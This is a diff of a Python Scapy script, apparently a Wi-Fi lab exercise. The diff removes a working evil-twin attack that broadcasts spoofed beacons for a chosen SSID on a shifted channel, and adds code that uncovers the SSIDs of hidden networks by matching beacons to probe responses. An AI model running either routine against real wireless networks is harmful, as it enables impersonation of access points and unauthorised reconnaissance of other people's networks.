@@ -1,9 +1,5 @@
 #!/usr/bin/env python
 
-# Sources : 
-# - https://gist.github.com/securitytube/5291959
-# - https://www.thepythoncode.com/article/create-fake-access-points-scapy
-
 from scapy.all import *
 from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap
 from scapy.sendrecv import sniff
@@ -11,7 +7,7 @@ from scapy.sendrecv import sniff
 iface = "wlp0s20u1"
 
 ap_list = []
-ap_ssidToChannel = {}
+ap_bssidToSsid = {}
 
 def inputNumber(message, imin, imax):
     while True:
@@ -27,46 +23,27 @@ def inputNumber(message, imin, imax):
             break
 
 def PacketHandler(packet):
-    if packet.haslayer(Dot11Beacon) and packet.getlayer(Dot11).addr2 not in ap_list:
-            ssid = packet.getlayer(Dot11Elt).info
-            if ssid == '' or packet.getlayer(Dot11Elt).ID != 0:
-                print "Hidden Network Detected"
-                ap_list.append(packet.getlayer(Dot11).addr2)
-    if Dot11ProbeResp in packet and Dot11Elt in packet[Dot11ProbeResp] and packet[Dot11ProbeResp][Dot11Elt].ID == 0 and packet.info not in ap_list:
-        try:
-            intensity = packet.dBm_AntSignal
-            ssid = packet.info
-            channel = int(ord(packet[Dot11Elt:3].info))
-            ap_list.append(ssid)
-            ap_ssidToChannel[ssid] = int(channel)
-            print("=== Target #%d ===\nssid: %s\nchannel: %s\nintensity: %d dBm" % (
-                len(ap_list), ssid.decode("utf-8"), str(channel), intensity))
-        except Exception as e:
-            print(e)
-            return
+    # Filter all beacon
+    if packet.haslayer(Dot11Beacon) and packet.getlayer(Dot11).addr3 not in ap_list:
+        # if no ssid or empty ssid
+        if packet.getlayer(Dot11Elt).info.decode("utf-8") == '' or packet.getlayer(Dot11Elt).ID != 0:
+            # this is a hidden network
+            print("Hidden Network Detected (BSSID: %s)" % packet.getlayer(Dot11).addr3)
+            ap_list.append(packet.getlayer(Dot11).addr3)
+            # if we already saw a probe response from this bssid
+            if packet.getlayer(Dot11).addr3 in ap_bssidToSsid:
+                # we found an association
+                print("Corresponding SSID found!")
+                print("\tBSSID: %s\tSSID: %s" % (packet.getlayer(Dot11).addr3, packet.getlayer(Dot11Elt).info.decode("utf-8")))
+    # Filter all probe response
+    if packet.haslayer(Dot11ProbeResp) and packet.getlayer(Dot11).addr3 not in ap_bssidToSsid:
+        ap_bssidToSsid[packet.getlayer(Dot11).addr3] = packet.getlayer(Dot11Elt).info
+        # if we previously detected an ap with this ssid
+        if packet.getlayer(Dot11).addr3 in ap_list:
+            # we found an association
+            print("Corresponding SSID found!")
+            print("\tBSSID: %s\tSSID: %s" % (packet.getlayer(Dot11).addr3, packet.getlayer(Dot11Elt).info.decode("utf-8")))
 
-# Sniff phase
-print("Press CTRL+C whenever you're happy with the SSIDs list.")
+print("Searching for suspicious beacon frames and corresponding probe responses...")
 sniff(iface=iface, prn=PacketHandler)
-
-# Target selection phase
-choice = inputNumber("Please select the target (1-%d): " % (len(ap_list)), 1, len(ap_list))
-
-# ATTACK
-ssid = ap_list[choice - 1]
-realChannel = ap_ssidToChannel[ssid]
-
-# Compute the fake channel (dist of 6 from the real one)
-fakeChannel = realChannel - 6 if realChannel > 6 else realChannel + 6
-
-print("Sending a fake beacons with SSID %s, channel %d (real channel is %d) (10/second)" % (ssid, fakeChannel, realChannel))
-
-sender_mac = RandMAC()
-dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac) # Create Dot11 packet
-beacon = Dot11Beacon(cap="ESS+privacy") # Add privacy
-essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) # Add ssid
-echann = Dot11Elt(ID="DSset", info=chr(fakeChannel)) # Add channel
-frame = RadioTap()/dot11/beacon/essid/echann # Create finale frame
-
-sendp(frame, inter=0.1, iface=iface, loop=1) # Emit the beacon (10 times per second)
 
